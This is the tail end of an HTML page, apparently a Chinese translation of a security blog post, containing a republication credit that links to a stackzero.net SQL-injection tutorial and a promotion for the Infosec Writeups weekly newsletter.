bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="im in io ip iq"><p id="cab4" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated"><em class="my">原载于2022年7月31日https://www.stackzero.net</em><em class="my"/><a class="ae lx" href="https://www.stackzero.net/learn-sql-injection-in-practice-by-hacking-vulnerable-application/" rel="noopener ugc nofollow" target="_blank"><em class="my">。</em></a></p><p id="e3bb" class="pw-post-body-paragraph kz la it lb b lc ma le lf lg mb li lj lk mo lm ln lo mp lq lr ls mq lu lv lw im bi translated"><em class="my">来自Infosec的报道:Infosec上每天都会出现很多难以跟上的内容。</em> <a class="ae lx" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="lb iu"> <em class="my">加入我们的每周简讯</em> </strong> </a> <em class="my">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>